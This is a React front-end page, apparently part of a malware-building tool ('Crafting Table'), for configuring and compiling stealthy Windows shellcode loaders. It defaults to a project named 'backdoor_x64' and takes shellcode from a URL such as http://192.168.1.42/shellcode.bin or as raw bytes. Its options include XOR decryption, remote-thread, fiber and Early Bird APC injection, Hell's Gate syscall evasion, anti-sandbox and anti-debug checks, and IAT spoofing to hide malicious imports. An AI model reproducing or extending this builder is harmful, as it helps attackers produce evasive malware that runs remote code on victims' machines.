'use client';

import { useState, useEffect } from 'react';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { Input } from "@/components/ui/input"
import { Button } from "@/components/ui/button"
import { Label } from "@/components/ui/label"
import { Textarea } from "@/components/ui/textarea"
import { Switch } from "@/components/ui/switch"
import { Badge } from "@/components/ui/badge"
import { CodePreviewModal } from '@/components/code-preview-modal';
import { apiClient } from '@/lib/api';
import type { PayloadRequest, IATFunction } from '@/lib/types';
import { PayloadSchema } from '@/lib/schemas/payload.schema';
import { CompileSchema } from '@/lib/schemas/compile.schema';
import {
    Shield,
    FileCode,
    Cpu,
    Ghost,
    Layers,
    Settings,
    Zap,
    Loader2,
    AlertCircle
} from "lucide-react"

export default function CreatorPage() {
    const [formData, setFormData] = useState<PayloadRequest>({
        name: 'backdoor_x64',
        output: 'exe',
        shellcode_url: '',
        injection_method: 'thread',
        syscall_evasion: 'hells_gate',
        anti_sandbox: [],
        anti_debug: [],
        iat_spoofing: [],
        export_function_name: 'DllMain',
        gui_mode: false,
    });

    const [iatFunctions, setIatFunctions] = useState<IATFunction[]>([]);
    const [selectedIATFunctions, setSelectedIATFunctions] = useState<Array<{ dll: string; function_name: string }>>([]);
    const [sourceCode, setSourceCode] = useState<string>('');
    const [isModalOpen, setIsModalOpen] = useState(false);
    const [isGenerating, setIsGenerating] = useState(false);
    const [isCompiling, setIsCompiling] = useState(false);
    const [error, setError] = useState<string>('');
    const [useShellcodeUrl, setUseShellcodeUrl] = useState(true);
    const [useXorKey, setUseXorKey] = useState(false);
    const [compilerFlags, setCompilerFlags] = useState<string>('-d:release --opt:size');

    // Clear features not supported for DLLs (IAT spoofing, Early Bird)
    useEffect(() => {
        if (formData.output === 'dll') {
            if (selectedIATFunctions.length > 0) {
                setSelectedIATFunctions([]);
            }
            if (formData.injection_method === 'early_bird') {
                setFormData(prev => ({ ...prev, injection_method: 'thread' }));
            }
        }
    }, [formData.output, selectedIATFunctions.length, formData.injection_method]);

    // Fetch IAT functions on mount
    useEffect(() => {
        const fetchIATFunctions = async () => {
            try {
                const response = await apiClient.getIATFunctions();
                setIatFunctions(response.functions);
            } catch (err) {
                console.error('Failed to fetch IAT functions:', err);
            }
        };
        fetchIATFunctions();
    }, []);

    const handleToggleAntiSandbox = (feature: 'cpu_ram' | 'timing' | 'human_behavior') => {
        setFormData((prev) => ({
            ...prev,
            anti_sandbox: prev.anti_sandbox.includes(feature)
                ? prev.anti_sandbox.filter((f) => f !== feature)
                : [...prev.anti_sandbox, feature],
        }));
    };

    const handleToggleAntiDebug = (feature: 'is_debugger_present' | 'nt_global_flag') => {
        setFormData((prev) => ({
            ...prev,
            anti_debug: prev.anti_debug.includes(feature)
                ? prev.anti_debug.filter((f) => f !== feature)
                : [...prev.anti_debug, feature],
        }));
    };

    const handleToggleIATFunction = (dll: string, functionName: string) => {
        const exists = selectedIATFunctions.some(
            (f) => f.dll === dll && f.function_name === functionName
        );

        if (exists) {
            setSelectedIATFunctions((prev) =>
                prev.filter((f) => !(f.dll === dll && f.function_name === functionName))
            );
        } else {
            setSelectedIATFunctions((prev) => [...prev, { dll, function_name: functionName }]);
        }
    };

    const handleGenerateSource = async () => {
        setIsGenerating(true);
        setError('');

        try {
            const payload = {
                ...formData,
                iat_spoofing: selectedIATFunctions,
                shellcode: useShellcodeUrl ? undefined : formData.shellcode,
                shellcode_url: useShellcodeUrl ? formData.shellcode_url : undefined,
                xor_key: useXorKey ? formData.xor_key : undefined,
                export_function_name: formData.output === 'dll' ? formData.export_function_name : undefined,
                gui_mode: formData.gui_mode,
            };

            // Client-side validation
            const validationResult = PayloadSchema.safeParse(payload);
            if (!validationResult.success) {
                const firstError = validationResult.error.issues[0];
                throw new Error(`${firstError.path.join('.')}: ${firstError.message}`);
            }

            const response = await apiClient.generatePayload(validationResult.data);
            setSourceCode(response.source_code);
            setIsModalOpen(true);
        } catch (err: any) {
            setError(err.message || 'Failed to generate source code');
        } finally {
            setIsGenerating(false);
        }
    };

    const handleApproveAndCompile = async () => {
        setIsCompiling(true);
        setError('');

        try {
            const compileReq = {
                code: sourceCode,
                output: formData.output,
                arch: 'amd64' as const,
                flags: compilerFlags.split(' ').filter(f => f.trim() !== ''),
                gui_mode: formData.gui_mode,
            };

            // Client-side validation
            const validationResult = CompileSchema.safeParse(compileReq);
            if (!validationResult.success) {
                const firstError = validationResult.error.issues[0];
                throw new Error(`${firstError.path.join('.')}: ${firstError.message}`);
            }

            const response = await apiClient.compileCode(validationResult.data);

            // Decode base64 and download
            const binaryData = atob(response.binary);
            const bytes = new Uint8Array(binaryData.length);
            for (let i = 0; i < binaryData.length; i++) {
                bytes[i] = binaryData.charCodeAt(i);
            }

            const blob = new Blob([bytes], { type: 'application/octet-stream' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `${formData.name}.${formData.output}`;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);

            setIsModalOpen(false);
            setSourceCode('');
        } catch (err: any) {
            setError(err.message || 'Compilation failed');
        } finally {
            setIsCompiling(false);
        }
    };

    const groupedIATFunctions = iatFunctions.reduce((acc, func) => {
        if (!acc[func.dll]) acc[func.dll] = [];
        acc[func.dll].push(func);
        return acc;
    }, {} as Record<string, IATFunction[]>);

    return (
        <div className="space-y-8 pb-10">
            <div>
                <h2 className="text-3xl font-black tracking-tighter text-emerald-500 uppercase">Crafting Table</h2>
                <p className="text-muted-foreground text-sm font-medium">
                    Concevez des loaders furtifs avec des techniques d'évasion industrielles.
                </p>
            </div>

            <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
                {/* Main Configuration Column */}
                <div className="lg:col-span-2 space-y-8">

                    {/* Binary Configuration */}
                    <Card className="glass-panel">
                        <CardHeader>
                            <CardTitle className="flex items-center gap-2">
                                <FileCode className="h-5 w-5 text-emerald-500" />
                                Configuration du Binaire
                            </CardTitle>
                        </CardHeader>
                        <CardContent className="space-y-6">
                            <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                                <div className="space-y-2">
                                    <Label>Nom du Projet</Label>
                                    <Input
                                        value={formData.name}
                                        onChange={(e) => setFormData({ ...formData, name: e.target.value })}
                                        placeholder="backdoor_x64"
                                        className="bg-background/50 border-white/5 focus:border-emerald-500/50 transition-colors"
                                    />
                                </div>
                                <div className="space-y-2">
                                    <Label>Format de Sortie</Label>
                                    <div className="flex gap-2">
                                        <Button
                                            variant={formData.output === 'exe' ? "default" : "outline"}
                                            onClick={() => setFormData({ ...formData, output: 'exe' })}
                                            className={formData.output === 'exe' ? "bg-emerald-500 hover:bg-emerald-600 text-black font-bold" : "border-white/10"}
                                        >
                                            Executable (.exe)
                                        </Button>
                                        <Button
                                            variant={formData.output === 'dll' ? "default" : "outline"}
                                            onClick={() => setFormData({ ...formData, output: 'dll' })}
                                            className={formData.output === 'dll' ? "bg-emerald-500 hover:bg-emerald-600 text-black font-bold" : "border-white/10"}
                                        >
                                            Library (.dll)
                                        </Button>
                                    </div>
                                </div>
                            </div>

                            {formData.output === 'dll' && (
                                <div className="space-y-2 animate-in fade-in slide-in-from-top-2 duration-300 border-t border-white/5 pt-4">
                                    <Label className="flex items-center gap-2">
                                        Nom de la Fonction Exportée
                                        <Badge variant="outline" className="text-[10px] py-0 border-emerald-500/20 text-emerald-500">Optionnel</Badge>
                                    </Label>
                                    <Input
                                        value={formData.export_function_name}
                                        onChange={(e) => setFormData({ ...formData, export_function_name: e.target.value })}
                                        placeholder="DllMain (par défaut)"
                                        className="font-mono text-xs bg-background/50 border-white/5"
                                    />
                                    <p className="text-[10px] text-muted-foreground italic">
                                        Utilisez <b className="text-emerald-500">DllMain</b> pour une exécution au chargement, ou un nom personnalisé.
                                    </p>
                                </div>
                            )}

                            <div className="space-y-4 pt-4 border-t border-white/5">
                                <div className="flex items-center justify-between">
                                    <Label className="text-base font-semibold">Source du Shellcode</Label>
                                    <div className="flex items-center gap-2">
                                        <span className={!useShellcodeUrl ? "text-emerald-500 font-medium" : "text-muted-foreground"}>Raw</span>
                                        <Switch checked={useShellcodeUrl} onCheckedChange={setUseShellcodeUrl} className="data-[state=checked]:bg-emerald-500" />
                                        <span className={useShellcodeUrl ? "text-emerald-500 font-medium" : "text-muted-foreground"}>URL</span>
                                    </div>
                                </div>
                                {useShellcodeUrl ? (
                                    <div className="space-y-2">
                                        <Label>Shellcode URL/File</Label>
                                        <Input
                                            value={formData.shellcode_url || ''}
                                            onChange={(e) => setFormData({ ...formData, shellcode_url: e.target.value })}
                                            placeholder="http://192.168.1.42/shellcode.bin"
                                            className="bg-background/50 border-white/5"
                                        />
                                    </div>
                                ) : (
                                    <div className="space-y-2">
                                        <Label>Raw Shellcode</Label>
                                        <Textarea
                                            value={formData.shellcode || ''}
                                            onChange={(e) => setFormData({ ...formData, shellcode: e.target.value })}
                                            placeholder="Paste shellcode here (0x54, 0x..)"
                                            className="min-h-[100px] font-mono text-xs bg-background/50 border-white/5"
                                        />
                                    </div>
                                )}
                            </div>

                            <div className="space-y-4 pt-4 border-t border-white/5">
                                <div className="flex items-center justify-between">
                                    <Label className="text-base font-semibold">Déchiffrement XOR</Label>
                                    <div className="flex items-center gap-2">
                                        <span className={!useXorKey ? "text-emerald-500 font-medium opacity-50" : "text-muted-foreground"}>Désactivé</span>
                                        <Switch checked={useXorKey} onCheckedChange={setUseXorKey} className="data-[state=checked]:bg-emerald-500" />
                                        <span className={useXorKey ? "text-emerald-500 font-medium" : "text-muted-foreground"}>Activé</span>
                                    </div>
                                </div>
                                {useXorKey && (
                                    <div className="space-y-2">
                                        <Label>Clé XOR (Format: 0xDE, 0xAD...)</Label>
                                        <Input
                                            value={formData.xor_key || ''}
                                            onChange={(e) => setFormData({ ...formData, xor_key: e.target.value })}
                                            placeholder="0xDE, 0xAD, 0xBE, 0xEF"
                                            className="font-mono text-xs bg-background/50 border-white/5"
                                        />
                                    </div>
                                )}
                            </div>
                        </CardContent>
                    </Card>

                    {/* Injection Method */}
                    <Card className="glass-panel">
                        <CardHeader>
                            <CardTitle className="flex items-center gap-2">
                                <Zap className="h-5 w-5 text-emerald-500" />
                                Méthode d&apos;Injection
                            </CardTitle>
                            <CardDescription>Choisir la technique d&apos;exécution du payload</CardDescription>
                        </CardHeader>
                        <CardContent>
                            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                                {([
                                    { id: 'thread', label: 'Thread Injection', desc: 'CreateRemoteThread simple' },
                                    { id: 'fiber', label: 'Fiber Injection', desc: 'Exécution via fibres légères' },
                                    { id: 'early_bird', label: 'Early Bird', desc: 'Queued APC Injection' },
                                ] as const).filter(m => formData.output === 'exe' || m.id !== 'early_bird').map((method) => (
                                    <div
                                        key={method.id}
                                        className={`cursor-pointer rounded-lg border p-4 hover:bg-emerald-500/5 transition-all duration-300 ${formData.injection_method === method.id ? 'border-emerald-500/50 bg-emerald-500/10 ring-1 ring-emerald-500/50 shadow-[0_0_15px_rgba(16,185,129,0.1)]' : 'border-white/5 bg-background/30'}`}
                                        onClick={() => setFormData({ ...formData, injection_method: method.id })}
                                    >
                                        <div className="flex items-center gap-2 mb-1">
                                            <div className={`h-2 w-2 rounded-full ${formData.injection_method === method.id ? 'bg-emerald-500 animate-pulse' : 'bg-muted-foreground'}`} />
                                            <span className={`font-bold ${formData.injection_method === method.id ? 'text-emerald-500' : ''}`}>{method.label}</span>
                                        </div>
                                        <p className="text-xs text-muted-foreground pl-4">{method.desc}</p>
                                    </div>
                                ))}
                            </div>
                        </CardContent>
                    </Card>
                </div>

                {/* Sidebar Configuration Column */}
                <div className="space-y-8">

                    {/* Evasion & Anti-Analysis */}
                    <Card className="glass-panel">
                        <CardHeader>
                            <CardTitle className="flex items-center gap-2">
                                <Ghost className="h-5 w-5 text-emerald-500" />
                                Furtivité
                            </CardTitle>
                        </CardHeader>
                        <CardContent className="space-y-6">
                            <div>
                                <Label className="text-emerald-500 text-[10px] font-black uppercase tracking-[0.2em] mb-4 block">Syscalls Evasion</Label>
                                <div className="space-y-4">
                                    <div className="flex items-center justify-between">
                                        <Label htmlFor="hg" className="font-semibold text-sm">Hell&apos;s Gate (x64)</Label>
                                        <Switch
                                            id="hg"
                                            checked={formData.syscall_evasion === 'hells_gate'}
                                            onCheckedChange={(c) => setFormData({ ...formData, syscall_evasion: c ? 'hells_gate' : 'none' })}
                                            className="data-[state=checked]:bg-emerald-500"
                                        />
                                    </div>
                                </div>
                            </div>

                            <div className="pt-4 border-t border-white/5">
                                <Label className="text-emerald-500 text-[10px] font-black uppercase tracking-[0.2em] mb-4 block">Anti-Sandbox / Debug</Label>
                                <div className="space-y-4">
                                    <div className="flex items-center justify-between">
                                        <Label className="text-sm">CPU/RAM Check</Label>
                                        <Switch
                                            checked={formData.anti_sandbox.includes('cpu_ram')}
                                            onCheckedChange={() => handleToggleAntiSandbox('cpu_ram')}
                                            className="data-[state=checked]:bg-emerald-500"
                                        />
                                    </div>
                                    <div className="flex items-center justify-between">
                                        <Label className="text-sm">Human Behavior</Label>
                                        <Switch
                                            checked={formData.anti_sandbox.includes('human_behavior')}
                                            onCheckedChange={() => handleToggleAntiSandbox('human_behavior')}
                                            className="data-[state=checked]:bg-emerald-500"
                                        />
                                    </div>
                                    <div className="flex items-center justify-between">
                                        <Label className="text-sm">Sleep Obfuscation</Label>
                                        <Switch
                                            checked={formData.anti_sandbox.includes('timing')}
                                            onCheckedChange={() => handleToggleAntiSandbox('timing')}
                                            className="data-[state=checked]:bg-emerald-500"
                                        />
                                    </div>
                                </div>
                            </div>

                            <div className="pt-4 border-t border-white/5">
                                <Label className="text-emerald-500 text-[10px] font-black uppercase tracking-[0.2em] mb-4 block">Compilateur (Flags)</Label>
                                <div className="space-y-2">
                                    <Label className="text-muted-foreground text-[10px] uppercase font-bold tracking-tighter">Flags Nim additionnels</Label>
                                    <Input
                                        className="font-mono text-xs bg-background/50 border-white/5 focus:border-emerald-500/50"
                                        value={compilerFlags}
                                        onChange={(e) => setCompilerFlags(e.target.value)}
                                        placeholder="-d:release --opt:size --app:gui"
                                    />
                                </div>
                                <div className="flex items-center justify-between pt-2">
                                    <Label className="text-sm font-semibold">GUI Mode</Label>
                                    <Switch
                                        checked={formData.gui_mode}
                                        onCheckedChange={(c) => setFormData({ ...formData, gui_mode: c })}
                                        className="data-[state=checked]:bg-emerald-500"
                                    />
                                </div>
                                <p className="text-[10px] text-muted-foreground italic">
                                    Ajoute <code className="text-emerald-500">--app:gui</code> pour masquer la console Windows.
                                </p>
                            </div>
                        </CardContent>
                    </Card>

                    {/* IAT Spoofing */}
                    {formData.output === 'exe' && (
                        <Card className="glass-panel">
                            <CardHeader>
                                <CardTitle className="flex items-center gap-2">
                                    <Layers className="h-5 w-5 text-emerald-500" />
                                    IAT Spoofing
                                </CardTitle>
                            </CardHeader>
                            <CardContent>
                                <p className="text-xs text-muted-foreground mb-4">
                                    Masquer les imports malveillants en incluant des fonctions légitimes.
                                </p>
                                <div className="h-[300px] overflow-y-auto pr-2 space-y-4 border border-white/5 rounded-md p-2 bg-background/30">
                                    {Object.entries(groupedIATFunctions).map(([dll, functions]) => (
                                        <div key={dll}>
                                            <h4 className="font-bold text-[10px] text-emerald-500/50 uppercase tracking-widest mb-2 sticky top-0 bg-background/80 backdrop-blur-sm py-1">{dll}.dll</h4>
                                            <div className="space-y-1">
                                                {functions.map((func) => {
                                                    const isSelected = selectedIATFunctions.some(
                                                        (f) => f.dll === dll && f.function_name === func.function_name
                                                    );
                                                    return (
                                                        <div
                                                            key={func.function_name}
                                                            className={`text-xs p-2 rounded cursor-pointer flex items-center justify-between transition-colors ${isSelected ? 'bg-emerald-500/20 text-emerald-500 font-bold' : 'hover:bg-emerald-500/5'}`}
                                                            onClick={() => handleToggleIATFunction(dll, func.function_name)}
                                                        >
                                                            <span>{func.function_name}</span>
                                                            {isSelected && <Badge variant="default" className="h-1.5 w-1.5 p-0 rounded-full bg-emerald-500" />}
                                                        </div>
                                                    );
                                                })}
                                            </div>
                                        </div>
                                    ))}
                                </div>
                            </CardContent>
                        </Card>
                    )}

                </div>
            </div>

            {/* Floating Action Bar / Bottom Bar */}
            <div className="fixed bottom-0 left-0 right-0 p-4 border-t border-white/5 bg-background/80 backdrop-blur-xl z-10 lg:pl-[280px]"> {/* 280px is sidebar width */}
                <div className="container max-w-7xl flex items-center justify-between">
                    <div className="flex items-center gap-2">
                        {error && (
                            <div className="flex items-center text-destructive text-sm font-medium animate-pulse">
                                <AlertCircle className="h-4 w-4 mr-2" />
                                {error}
                            </div>
                        )}
                    </div>
                    <Button
                        size="lg"
                        className="bg-emerald-500 hover:bg-emerald-600 text-black font-black uppercase tracking-widest shadow-[0_0_20px_rgba(16,185,129,0.3)] transition-all hover:scale-105"
                        onClick={handleGenerateSource}
                        disabled={isGenerating}
                    >
                        {isGenerating ? (
                            <>
                                <Loader2 className="mr-2 h-5 w-5 animate-spin" />
                                Analyse en cours...
                            </>
                        ) : (
                            <>
                                <Cpu className="mr-2 h-5 w-5" />
                                Forger le Binaire
                            </>
                        )}
                    </Button>
                </div>
            </div>

            <CodePreviewModal
                isOpen={isModalOpen}
                onOpenChange={setIsModalOpen}
                sourceCode={sourceCode}
                onApprove={handleApproveAndCompile}
                isCompiling={isCompiling}
            />
        </div>
    );
}
